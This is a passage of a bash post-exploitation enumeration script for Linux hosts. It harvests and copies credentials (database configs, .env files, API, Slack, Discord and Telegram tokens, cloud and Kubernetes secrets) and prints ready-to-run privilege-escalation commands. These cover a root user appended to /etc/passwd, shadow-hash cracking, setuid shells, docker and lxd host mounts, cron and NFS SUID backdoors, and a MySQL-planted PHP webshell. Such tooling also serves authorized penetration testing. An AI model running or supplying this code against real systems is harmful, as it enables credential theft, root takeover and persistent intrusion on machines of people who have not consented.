if [ "$dbconfigfiles" ]; then
  echo -e "\e[00;33m[+] Database configuration files with credentials:\e[00m\n$dbconfigfiles"
  echo -e "\n"
fi

if [ "$export" ] && [ "$dbconfigfiles" ]; then
  dbconflist=`find /home /var/www /opt /etc -type f \( -name "database.yml" -o -name "database.yaml" -o -name "db.conf" -o -name "db.config" -o -name "*database*.ini" -o -name "datasource.properties" -o -name "hibernate.cfg.xml" -o -name "persistence.xml" \) 2>/dev/null`
  mkdir $format/database-configs/ 2>/dev/null
  for i in $dbconflist; do cp --parents $i $format/database-configs/ 2>/dev/null; done
fi

# WordPress wp-config.php (common target)
wpconfig=`find /var/www /home /opt -type f -name "wp-config.php" 2>/dev/null | xargs grep -H "DB_NAME\|DB_USER\|DB_PASSWORD\|DB_HOST" 2>/dev/null`
if [ "$wpconfig" ]; then
  echo -e "\e[00;33m[+] WordPress database credentials found:\e[00m\n$wpconfig"
  echo -e "\n"
fi

if [ "$export" ] && [ "$wpconfig" ]; then
  wpconfigfiles=`find /var/www /home /opt -type f -name "wp-config.php" 2>/dev/null`
  mkdir $format/wordpress-configs/ 2>/dev/null
  for i in $wpconfigfiles; do cp --parents $i $format/wordpress-configs/ 2>/dev/null; done
fi

# Drupal settings.php
drupalconfig=`find /var/www /home /opt -type f -name "settings.php" 2>/dev/null | xargs grep -H "database\|username\|password\|host" 2>/dev/null | grep -v "^\s*//" | head -20`
if [ "$drupalconfig" ]; then
  echo -e "\e[00;33m[+] Drupal database credentials found:\e[00m\n$drupalconfig"
  echo -e "\n"
fi

# Joomla configuration.php
joomlaconfig=`find /var/www /home /opt -type f -name "configuration.php" 2>/dev/null | xargs grep -H "db\|user\|password\|host" 2>/dev/null | grep -i "public.*=" | head -20`
if [ "$joomlaconfig" ]; then
  echo -e "\e[00;33m[+] Joomla database credentials found:\e[00m\n$joomlaconfig"
  echo -e "\n"
fi

# Laravel .env database settings
laravelenv=`find /var/www /home /opt -type f -name ".env" 2>/dev/null | xargs grep -H "DB_CONNECTION\|DB_HOST\|DB_PORT\|DB_DATABASE\|DB_USERNAME\|DB_PASSWORD" 2>/dev/null | head -30`
if [ "$laravelenv" ]; then
  echo -e "\e[00;33m[+] Laravel database credentials in .env:\e[00m\n$laravelenv"
  echo -e "\n"
fi

# Django settings.py database configuration
djangosettings=`find /var/www /home /opt -type f -name "settings.py" 2>/dev/null | xargs grep -A 10 "DATABASES\s*=" 2>/dev/null | grep -E "ENGINE|NAME|USER|PASSWORD|HOST|PORT" | head -30`
if [ "$djangosettings" ]; then
  echo -e "\e[00;33m[+] Django database credentials found:\e[00m\n$djangosettings"
  echo -e "\n"
fi

# Connection string environment variables in various formats
echo -e "\e[00;31m[-] Searching for database connection environment variables...\e[00m"

dbenvvars=`grep -rEi "DATABASE_URL=|DB_URL=|SQLALCHEMY_DATABASE_URI=|CONNECTION_STRING=" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(env|conf|config|sh|bash):" 2>/dev/null | head -25`
if [ "$dbenvvars" ]; then
  echo -e "\e[00;33m[+] Database connection string environment variables:\e[00m\n$dbenvvars"
  echo -e "\n"
fi

#Search for API keys and tokens
echo -e "\e[00;31m[-] Searching for API keys and tokens...\e[00m"

apikeys=`grep -rEi "api[_-]?key|apikey|access[_-]?key|secret[_-]?key|private[_-]?key|auth[_-]?token|bearer" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|env|js|py|rb|java|php):" 2>/dev/null | grep -v "example\|sample\|test\|TODO\|your_api_key\|YOUR_API_KEY\|<api" | head -30`
if [ "$apikeys" ]; then
  echo -e "\e[00;33m[+] API keys/tokens found:\e[00m\n$apikeys"
  echo -e "\n"
fi

#Search for .env files (often contain credentials)
echo -e "\e[00;31m[-] Searching for .env files...\e[00m"

envfiles=`find /home /var/www /opt -type f -name ".env*" 2>/dev/null | xargs -I {} sh -c 'echo "==> {}" && cat {} 2>/dev/null | head -20' 2>/dev/null`
if [ "$envfiles" ]; then
  echo -e "\e[00;33m[+] .env files found (showing first 20 lines of each):\e[00m\n$envfiles"
  echo -e "\n"
fi

if [ "$export" ] && [ "$envfiles" ]; then
  envfilelist=`find /home /var/www /opt -type f -name ".env*" 2>/dev/null`
  mkdir $format/env-files/ 2>/dev/null
  for i in $envfilelist; do cp --parents $i $format/env-files/ 2>/dev/null; done
fi

#Search for credentials in common application config files
echo -e "\e[00;31m[-] Checking common application config files...\e[00m"

appconfigs=`find /home /var/www /opt -type f \( -name "config.php" -o -name "database.yml" -o -name "settings.py" -o -name "application.properties" -o -name "web.config" -o -name "wp-config.php" \) 2>/dev/null | xargs -I {} sh -c 'ls -la {} && grep -Ei "password|passwd|pwd|secret|key" {} 2>/dev/null | head -10' 2>/dev/null`
if [ "$appconfigs" ]; then
  echo -e "\e[00;33m[+] Credentials found in application config files:\e[00m\n$appconfigs"
  echo -e "\n"
fi

#Search for FTP/SFTP credentials
echo -e "\e[00;31m[-] Searching for FTP/SFTP credentials...\e[00m"

ftpcreds=`find /home -type f \( -name ".netrc" -o -name ".ftpconfig" -o -name "filezilla.xml" -o -name "recentservers.xml" \) 2>/dev/null | xargs -I {} sh -c 'echo "==> {}" && cat {} 2>/dev/null' 2>/dev/null`
if [ "$ftpcreds" ]; then
  echo -e "\e[00;33m[+] FTP/SFTP credential files found:\e[00m\n$ftpcreds"
  echo -e "\n"
fi

if [ "$export" ] && [ "$ftpcreds" ]; then
  ftpcredfiles=`find /home -type f \( -name ".netrc" -o -name ".ftpconfig" -o -name "filezilla.xml" -o -name "recentservers.xml" \) 2>/dev/null`
  mkdir $format/ftp-credentials/ 2>/dev/null
  for i in $ftpcredfiles; do cp --parents $i $format/ftp-credentials/ 2>/dev/null; done
fi

#Search for SMTP/email credentials
echo -e "\e[00;31m[-] Searching for email/SMTP credentials...\e[00m"

emailcreds=`grep -rEi "smtp|imap|pop3|mail_username|mail_password|email.*password" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|env|php|py):" 2>/dev/null | grep -i "password\|username\|user\|pass" | head -20`
if [ "$emailcreds" ]; then
  echo -e "\e[00;33m[+] Email/SMTP credentials found:\e[00m\n$emailcreds"
  echo -e "\n"
fi

#Search for Slack tokens and webhooks
echo -e "\e[00;31m[-] Searching for Slack tokens and webhooks...\e[00m"

# Slack Bot tokens (xoxb-)
slackbottokens=`grep -rEi "xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | head -20`
if [ "$slackbottokens" ]; then
  echo -e "\e[00;33m[+] Slack Bot tokens found:\e[00m\n$slackbottokens"
  echo -e "\n"
fi

# Slack User tokens (xoxp-)
slackusertokens=`grep -rEi "xoxp-[0-9]{10,13}-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{32}" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | head -20`
if [ "$slackusertokens" ]; then
  echo -e "\e[00;33m[+] Slack User tokens found:\e[00m\n$slackusertokens"
  echo -e "\n"
fi

# Slack Workspace tokens (xoxa-)
slackworkspacetokens=`grep -rEi "xoxa-[0-9]+-[0-9]+-[0-9]+-[a-zA-Z0-9]+" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | head -15`
if [ "$slackworkspacetokens" ]; then
  echo -e "\e[00;33m[+] Slack Workspace tokens found:\e[00m\n$slackworkspacetokens"
  echo -e "\n"
fi

# Slack OAuth tokens (xoxo-)
slackoauthtokens=`grep -rEi "xoxo-[0-9]{10,13}-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{32}" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | head -15`
if [ "$slackoauthtokens" ]; then
  echo -e "\e[00;33m[+] Slack OAuth tokens found:\e[00m\n$slackoauthtokens"
  echo -e "\n"
fi

# Slack Webhooks
slackwebhooks=`grep -rEi "https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | head -20`
if [ "$slackwebhooks" ]; then
  echo -e "\e[00;33m[+] Slack incoming webhooks found:\e[00m\n$slackwebhooks"
  echo -e "\n"
fi

# Slack API references in config files
slackconfigs=`grep -rEi "SLACK_TOKEN|SLACK_WEBHOOK|SLACK_API|slack_token|slack_webhook" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(env|conf|config|cfg|ini|yaml|yml|json|xml|sh|bash|py|js|rb):" 2>/dev/null | head -25`
if [ "$slackconfigs" ]; then
  echo -e "\e[00;33m[+] Slack configuration entries:\e[00m\n$slackconfigs"
  echo -e "\n"
fi

if [ "$export" ] && [ "$slackconfigs" ]; then
  slackconfigfiles=`grep -rli "SLACK_TOKEN\|SLACK_WEBHOOK\|xoxb-\|xoxp-" /home /var/www /opt /etc 2>/dev/null | grep -E "\.(env|conf|config|json|yaml|yml)" 2>/dev/null`
  if [ "$slackconfigfiles" ]; then
    mkdir $format/slack-tokens/ 2>/dev/null
    for i in $slackconfigfiles; do cp --parents $i $format/slack-tokens/ 2>/dev/null; done
  fi
fi

#Search for Discord tokens and webhooks
echo -e "\e[00;31m[-] Searching for Discord tokens and webhooks...\e[00m"

# Discord Bot tokens
discordbottokens=`grep -rEi "[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | grep -v "node_modules" | head -20`
if [ "$discordbottokens" ]; then
  echo -e "\e[00;33m[+] Discord Bot tokens found (pattern match):\e[00m\n$discordbottokens"
  echo -e "\n"
fi

# Discord Webhooks
discordwebhooks=`grep -rEi "https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | head -20`
if [ "$discordwebhooks" ]; then
  echo -e "\e[00;33m[+] Discord webhooks found:\e[00m\n$discordwebhooks"
  echo -e "\n"
fi

# Discord alternative webhook format
discordwebhooksalt=`grep -rEi "https://discordapp\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | head -20`
if [ "$discordwebhooksalt" ]; then
  echo -e "\e[00;33m[+] Discord webhooks found (alternative format):\e[00m\n$discordwebhooksalt"
  echo -e "\n"
fi

# Discord configuration entries
discordconfigs=`grep -rEi "DISCORD_TOKEN|DISCORD_WEBHOOK|DISCORD_BOT|discord_token|discord_webhook" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(env|conf|config|cfg|ini|yaml|yml|json|xml|sh|bash|py|js|rb):" 2>/dev/null | head -25`
if [ "$discordconfigs" ]; then
  echo -e "\e[00;33m[+] Discord configuration entries:\e[00m\n$discordconfigs"
  echo -e "\n"
fi

if [ "$export" ] && [ "$discordconfigs" ]; then
  discordconfigfiles=`grep -rli "DISCORD_TOKEN\|DISCORD_WEBHOOK\|discord\.com/api/webhooks" /home /var/www /opt /etc 2>/dev/null | grep -E "\.(env|conf|config|json|yaml|yml)" 2>/dev/null`
  if [ "$discordconfigfiles" ]; then
    mkdir $format/discord-tokens/ 2>/dev/null
    for i in $discordconfigfiles; do cp --parents $i $format/discord-tokens/ 2>/dev/null; done
  fi
fi

#Search for Telegram Bot tokens
echo -e "\e[00;31m[-] Searching for Telegram Bot tokens...\e[00m"

telegrambottokens=`grep -rEi "[0-9]{8,10}:[A-Za-z0-9_-]{35}" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | head -20`
if [ "$telegrambottokens" ]; then
  echo -e "\e[00;33m[+] Telegram Bot tokens found:\e[00m\n$telegrambottokens"
  echo -e "\n"
fi

telegramconfigs=`grep -rEi "TELEGRAM_TOKEN|TELEGRAM_BOT|TELEGRAM_API|telegram_token|bot_token" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(env|conf|config|cfg|ini|yaml|yml|json|xml|py|js|rb):" 2>/dev/null | head -20`
if [ "$telegramconfigs" ]; then
  echo -e "\e[00;33m[+] Telegram configuration entries:\e[00m\n$telegramconfigs"
  echo -e "\n"
fi

#Search for Microsoft Teams webhooks
echo -e "\e[00;31m[-] Searching for Microsoft Teams webhooks...\e[00m"

teamswebhooks=`grep -rEi "https://[a-z0-9]+\.webhook\.office\.com/webhookb2/[a-zA-Z0-9@-]+/IncomingWebhook/[a-zA-Z0-9/-]+" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | head -15`
if [ "$teamswebhooks" ]; then
  echo -e "\e[00;33m[+] Microsoft Teams webhooks found:\e[00m\n$teamswebhooks"
  echo -e "\n"
fi

teamsconfigs=`grep -rEi "TEAMS_WEBHOOK|MS_TEAMS|teams_webhook_url" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(env|conf|config|json|yaml|yml):" 2>/dev/null | head -15`
if [ "$teamsconfigs" ]; then
  echo -e "\e[00;33m[+] Microsoft Teams configuration entries:\e[00m\n$teamsconfigs"
  echo -e "\n"
fi

#Search for Mattermost webhooks
echo -e "\e[00;31m[-] Searching for Mattermost webhooks...\e[00m"

mattermostwebhooks=`grep -rEi "https://[a-z0-9.-]+/hooks/[a-zA-Z0-9]+" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | grep -i "mattermost" | head -15`
if [ "$mattermostwebhooks" ]; then
  echo -e "\e[00;33m[+] Mattermost webhooks found:\e[00m\n$mattermostwebhooks"
  echo -e "\n"
fi

#Search for generic webhook patterns
echo -e "\e[00;31m[-] Searching for generic webhook URLs...\e[00m"

genericwebhooks=`grep -rEi "webhook.*https?://|https?://.*webhook" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | grep -E "\.(env|conf|config|json|yaml|yml):" 2>/dev/null | head -20`
if [ "$genericwebhooks" ]; then
  echo -e "\e[00;33m[+] Generic webhook URLs found:\e[00m\n$genericwebhooks"
  echo -e "\n"
fi

#Search for hardcoded credentials in scripts
if [ "$thorough" = "1" ]; then
  echo -e "\e[00;31m[-] Searching for hardcoded credentials in scripts (thorough mode)...\e[00m"
  
  scriptcreds=`find /home /var/www /opt -type f \( -name "*.sh" -o -name "*.py" -o -name "*.php" -o -name "*.pl" -o -name "*.rb" -o -name "*.js" \) 2>/dev/null | xargs grep -EHi "password\s*=\s*['\"][^'\"]{3,}['\"]|passwd\s*=\s*['\"][^'\"]{3,}['\"]|pwd\s*=\s*['\"][^'\"]{3,}['\"]" 2>/dev/null | head -30`
  if [ "$scriptcreds" ]; then
    echo -e "\e[00;33m[+] Hardcoded credentials in scripts:\e[00m\n$scriptcreds"
    echo -e "\n"
  fi
fi

#Search for cloud provider credentials (AWS, Azure, GCP)
echo -e "\e[00;31m[-] Searching for cloud provider credentials...\e[00m"

cloudcreds=`find /home -type f \( -name "credentials" -o -name "config" -o -name ".aws" -o -name ".azure" -o -name ".gcloud" \) 2>/dev/null | grep -E "(\.aws|\.azure|\.config/gcloud)" | xargs -I {} sh -c 'echo "==> {}" && cat {} 2>/dev/null | head -15' 2>/dev/null`
if [ "$cloudcreds" ]; then
  echo -e "\e[00;33m[+] Cloud provider credential files found:\e[00m\n$cloudcreds"
  echo -e "\n"
fi

if [ "$export" ] && [ "$cloudcreds" ]; then
  cloudcredfiles=`find /home -type f \( -name "credentials" -o -name "config" \) 2>/dev/null | grep -E "(\.aws|\.azure|\.config/gcloud)"`
  mkdir $format/cloud-credentials/ 2>/dev/null
  for i in $cloudcredfiles; do cp --parents $i $format/cloud-credentials/ 2>/dev/null; done
fi

#Search for Docker/Kubernetes secrets
echo -e "\e[00;31m[-] Searching for container orchestration secrets...\e[00m"

containersecrets=`find /home /var /opt -type f \( -name "*.dockercfg" -o -name "config.json" -o -name "*kubeconfig*" \) 2>/dev/null | grep -E "(\.docker|\.kube)" | xargs -I {} sh -c 'echo "==> {}" && cat {} 2>/dev/null | head -15' 2>/dev/null`
if [ "$containersecrets" ]; then
  echo -e "\e[00;33m[+] Container orchestration secrets found:\e[00m\n$containersecrets"
  echo -e "\n"
fi

#Search for private keys with potential passwords
echo -e "\e[00;31m[-] Searching for encrypted private keys (may have passwords)...\e[00m"

encryptedkeys=`find /home -type f -name "*.pem" -o -name "*.key" -o -name "*_rsa" -o -name "*_dsa" 2>/dev/null | xargs grep -l "ENCRYPTED" 2>/dev/null`
if [ "$encryptedkeys" ]; then
  echo -e "\e[00;33m[+] Encrypted private keys found (may be crackable):\e[00m\n$encryptedkeys"
  echo -e "\n"
fi

#Search for password files
echo -e "\e[00;31m[-] Searching for files with 'password' in the name...\e[00m"

passwordfiles=`find /home /var/www /opt -type f -iname "*password*" -o -iname "*passwd*" -o -iname "*pwd*" 2>/dev/null | grep -v "\.cache\|\.mozilla\|\.config" | head -30`
if [ "$passwordfiles" ]; then
  echo -e "\e[00;33m[+] Files with 'password' in filename:\e[00m\n$passwordfiles"
  echo -e "\n"
fi

echo -e "\e[00;33m[!] Remember to check:\e[00m"
echo -e "\e[00;33m    - Backup files (.bak, .old, .backup)\e[00m"
echo -e "\e[00;33m    - Version control (.git/config)\e[00m"
echo -e "\e[00;33m    - Log files (may contain credentials in plaintext)\e[00m"
echo -e "\n"
}

docker_checks()
{

#specific checks - check to see if we're in a docker container
dockercontainer=` grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
if [ "$dockercontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a Docker container:\e[00m\n$dockercontainer" 
  echo -e "\n"
fi

#specific checks - check to see if we're a docker host
dockerhost=`docker --version 2>/dev/null; docker ps -a 2>/dev/null`
if [ "$dockerhost" ]; then
  echo -e "\e[00;33m[+] Looks like we're hosting Docker:\e[00m\n$dockerhost" 
  echo -e "\n"
fi

#specific checks - are we a member of the docker group
dockergrp=`id | grep -i docker 2>/dev/null`
if [ "$dockergrp" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: We're a member of the (docker) group - could possibly misuse these rights!\e[00m\n$dockergrp" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockerfiles=`find / -name Dockerfile -exec ls -l {} 2>/dev/null \;`
if [ "$dockerfiles" ]; then
  echo -e "\e[00;31m[-] Anything juicy in the Dockerfile:\e[00m\n$dockerfiles" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockeryml=`find / -name docker-compose.yml -exec ls -l {} 2>/dev/null \;`
if [ "$dockeryml" ]; then
  echo -e "\e[00;31m[-] Anything juicy in docker-compose.yml:\e[00m\n$dockeryml" 
  echo -e "\n"
fi
}

lxc_container_checks()
{

#specific checks - are we in an lxd/lxc container
lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`
if [ "$lxccontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a lxc container:\e[00m\n$lxccontainer"
  echo -e "\n"
fi

#specific checks - are we a member of the lxd group
lxdgroup=`id | grep -i lxd 2>/dev/null`
if [ "$lxdgroup" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: We're a member of the (lxd) group - could possibly misuse these rights!\e[00m\n$lxdgroup"
  echo -e "\n"
fi
}

footer()
{
if [ "$quiet" = "1" ]; then
  echo ""
  echo -e "\e[00;36m╔════════════════════════════════════════════════════════════════╗\e[00m"
  if [ "$HIGH_VALUE_COUNT" -gt 0 ]; then
    echo -e "\e[00;36m║\e[00m  \e[00;33m⚠  HIGH-VALUE FINDINGS: $HIGH_VALUE_COUNT CRITICAL ISSUES FOUND\e[00m  \e[00;36m║\e[00m"
  else
    echo -e "\e[00;36m║\e[00m  \e[00;32m✓  NO HIGH-VALUE FINDINGS DETECTED\e[00m                        \e[00;36m║\e[00m"
  fi
  echo -e "\e[00;36m╚════════════════════════════════════════════════════════════════╝\e[00m"
else
  echo -e "\e[00;33m### SCAN COMPLETE ####################################\e[00m"
fi
}

recommendations_engine()
{
echo -e "\e[00;33m### RECOMMENDATIONS & EXPLOITATION TECHNIQUES ##########\e[00m"
echo -e "\e[00;31m[-] Analyzing findings and generating exploitation recommendations...\e[00m"
echo -e "\n"

# Check for SUID binaries
suids=`find / -perm -4000 -type f 2>/dev/null | wc -l`
if [ "$suids" -gt 0 ]; then
  intsuid=`find / -perm -4000 -type f 2>/dev/null | grep -E "nmap|vim|find|bash|more|less|nano|cp|mv|awk|perl|python|ruby|lua|php|socat|node|gcc" | head -5`
  if [ "$intsuid" ]; then
    echo -e "\e[00;33m[!] PRIVILEGE ESCALATION OPPORTUNITY - SUID Binaries:\e[00m"
    echo -e "\e[00;32m[+] Found interesting SUID binaries:\e[00m\n$intsuid"
    echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
    echo -e "    - Check GTFOBins (https://gtfobins.github.io/) for each binary"
    echo -e "    - Example for 'find': find . -exec /bin/sh -p \\; -quit"
    echo -e "    - Example for 'vim': vim -c ':!/bin/sh'"
    echo -e "    - Example for 'nmap': nmap --interactive then !sh"
    echo -e "\n"
  fi
fi

# Check for writable /etc/passwd
writablepasswd=`test -w /etc/passwd 2>/dev/null && echo "writable"`
if [ "$writablepasswd" ]; then
  echo -e "\e[00;33m[!] CRITICAL - Writable /etc/passwd:\e[00m"
  echo -e "\e[00;32m[+] /etc/passwd is writable!\e[00m"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Generate password hash: openssl passwd -1 -salt xyz password123"
  echo -e "    - Add new root user: echo 'hacker:\$1\$xyz\$...:0:0:root:/root:/bin/bash' >> /etc/passwd"
  echo -e "    - Switch user: su hacker"
  echo -e "\n"
fi

# Check for writable /etc/shadow
writableshadow=`test -w /etc/shadow 2>/dev/null && echo "writable"`
if [ "$writableshadow" ]; then
  echo -e "\e[00;33m[!] CRITICAL - Writable /etc/shadow:\e[00m"
  echo -e "\e[00;32m[+] /etc/shadow is writable!\e[00m"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Generate password: mkpasswd -m sha-512 password123"
  echo -e "    - Replace root hash in /etc/shadow"
  echo -e "    - Alternative: Add new user with UID 0"
  echo -e "\n"
fi

# Check for sudo without password
sudocheck=`echo '' | sudo -S -l -k 2>/dev/null | grep -i "NOPASSWD"`
if [ "$sudocheck" ]; then
  echo -e "\e[00;33m[!] PRIVILEGE ESCALATION - Passwordless Sudo:\e[00m"
  echo -e "\e[00;32m[+] Can run sudo without password:\e[00m\n$sudocheck"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - If 'ALL': sudo su -"
  echo -e "    - If specific binary: sudo <binary> (check GTFOBins for exploitation)"
  echo -e "    - Sudo version < 1.8.28: Try 'sudo -u#-1 /bin/bash' (CVE-2019-14287)"
  echo -e "\n"
fi

# Check for world-writable files in PATH
pathcheck=`echo $PATH | tr ':' '\n' | xargs -I {} find {} -maxdepth 1 -type f -writable 2>/dev/null | head -5`
if [ "$pathcheck" ]; then
  echo -e "\e[00;33m[!] PRIVILEGE ESCALATION - Writable Files in PATH:\e[00m"
  echo -e "\e[00;32m[+] Found writable files in PATH:\e[00m\n$pathcheck"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Replace binary with malicious version"
  echo -e "    - Wait for root/privileged user to execute"
  echo -e "    - Example: echo '#!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash' > writable_file"
  echo -e "\n"
fi

# Check for readable /etc/shadow
readableshadow=`test -r /etc/shadow 2>/dev/null && echo "readable"`
if [ "$readableshadow" ]; then
  echo -e "\e[00;33m[!] PASSWORD CRACKING - Readable /etc/shadow:\e[00m"
  echo -e "\e[00;32m[+] /etc/shadow is readable!\e[00m"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Extract hashes: cat /etc/shadow"
  echo -e "    - Use John: unshadow /etc/passwd /etc/shadow > hashes.txt && john hashes.txt"
  echo -e "    - Use Hashcat: hashcat -m 1800 hashes.txt wordlist.txt"
  echo -e "    - Focus on user accounts (not system accounts)"
  echo -e "\n"
fi

# Check for capabilities
capscheck=`getcap -r / 2>/dev/null | grep -v "Operation not permitted"`
if [ "$capscheck" ]; then
  echo -e "\e[00;33m[!] PRIVILEGE ESCALATION - File Capabilities:\e[00m"
  echo -e "\e[00;32m[+] Files with capabilities:\e[00m\n$capscheck"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - cap_setuid+ep: Can change UID to root"
  echo -e "    - python with cap_setuid: python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
  echo -e "    - perl with cap_setuid: perl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/bash\";'"
  echo -e "\n"
fi

# Check for Docker group membership
dockergrp=`id | grep -i docker`
if [ "$dockergrp" ]; then
  echo -e "\e[00;33m[!] CONTAINER ESCAPE - Docker Group Membership:\e[00m"
  echo -e "\e[00;32m[+] User is member of docker group!\e[00m"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Mount host filesystem: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
  echo -e "    - Access host as root inside container"
  echo -e "    - Alternative: docker run -v /etc/shadow:/tmp/shadow -it alpine cat /tmp/shadow"
  echo -e "\n"
fi

# Check for LXD group membership
lxdgrp=`id | grep -i lxd`
if [ "$lxdgrp" ]; then
  echo -e "\e[00;33m[!] CONTAINER ESCAPE - LXD Group Membership:\e[00m"
  echo -e "\e[00;32m[+] User is member of lxd group!\e[00m"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Download alpine image on attacker: git clone https://github.com/saghul/lxd-alpine-builder"
  echo -e "    - Build image: ./build-alpine"
  echo -e "    - Transfer to target and import: lxc image import alpine.tar.gz --alias alpine"
  echo -e "    - Create container: lxc init alpine privesc -c security.privileged=true"
  echo -e "    - Mount host: lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
  echo -e "    - Start and access: lxc start privesc && lxc exec privesc /bin/sh"
  echo -e "\n"
fi

# Check for writable cron jobs
writablecron=`find /etc/cron* -type f -writable 2>/dev/null`
if [ "$writablecron" ]; then
  echo -e "\e[00;33m[!] PRIVILEGE ESCALATION - Writable Cron Jobs:\e[00m"
  echo -e "\e[00;32m[+] Writable cron files found:\e[00m\n$writablecron"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Add malicious command to cron file"
  echo -e "    - Example: echo '* * * * * root cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> cron_file"
  echo -e "    - Wait for cron to execute"
  echo -e "    - Execute: /tmp/rootbash -p"
  echo -e "\n"
fi

# Check for NFS shares with no_root_squash
nfscheck=`cat /etc/exports 2>/dev/null | grep "no_root_squash"`
if [ "$nfscheck" ]; then
  echo -e "\e[00;33m[!] PRIVILEGE ESCALATION - NFS no_root_squash:\e[00m"
  echo -e "\e[00;32m[+] NFS share with no_root_squash found:\e[00m\n$nfscheck"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - From attacker machine: mkdir /tmp/nfs"
  echo -e "    - Mount: mount -t nfs <target_ip>:<share> /tmp/nfs"
  echo -e "    - Create SUID binary: cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash"
  echo -e "    - On target: /shared/bash -p"
  echo -e "\n"
fi

# Check kernel version for known exploits
kernelver=`uname -r 2>/dev/null`
if [ "$kernelver" ]; then
  echo -e "\e[00;33m[!] KERNEL EXPLOITS - Version Analysis:\e[00m"
  echo -e "\e[00;32m[+] Current kernel: $kernelver\e[00m"
  echo -e "\e[00;36m[*] Recommended Tools:\e[00m"
  echo -e "    - linux-exploit-suggester: ./linux-exploit-suggester.sh"
  echo -e "    - LinPEAS: ./linpeas.sh"
  echo -e "    - Check manually: searchsploit linux kernel $kernelver"
  
  # Check for specific vulnerable versions
  case "$kernelver" in
    2.6.*)
      echo -e "\e[00;33m    - Potential: Dirty COW (CVE-2016-5195)\e[00m"
      echo -e "    - Potential: RDS Protocol (CVE-2010-3904)"
      ;;
    3.*)
      echo -e "\e[00;33m    - Potential: Dirty COW (CVE-2016-5195)\e[00m"
      echo -e "    - Potential: OverlayFS (CVE-2015-1328)"
      ;;
    4.*)
      echo -e "\e[00;33m    - Potential: AF_PACKET (CVE-2017-7308)\e[00m"
      echo -e "    - Check for Ubuntu/Debian specific exploits"
      ;;
  esac
  echo -e "\n"
fi

# Check for MySQL root access
mysqlroot=`mysqladmin -uroot version 2>/dev/null | grep -i "server version"`
if [ "$mysqlroot" ]; then
  echo -e "\e[00;33m[!] DATABASE ACCESS - MySQL Root Without Password:\e[00m"
  echo -e "\e[00;32m[+] MySQL accessible as root without password!\e[00m"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Extract credentials: mysql -u root -e 'SELECT user,authentication_string FROM mysql.user;'"
  echo -e "    - UDF Privilege Escalation if running as root"
  echo -e "    - Read files: mysql -u root -e 'SELECT LOAD_FILE(\"/etc/shadow\");'"
  echo -e "    - Write webshell: mysql -u root -e 'SELECT \"<?php system(\\\$_GET[cmd]); ?>\" INTO OUTFILE \"/var/www/html/shell.php\";'"
  echo -e "\n"
fi

# Check for SSH keys
sshkeys=`find /home -name "id_rsa" -o -name "id_dsa" 2>/dev/null | head -5`
if [ "$sshkeys" ]; then
  echo -e "\e[00;33m[!] LATERAL MOVEMENT - SSH Private Keys:\e[00m"
  echo -e "\e[00;32m[+] SSH private keys found:\e[00m\n$sshkeys"
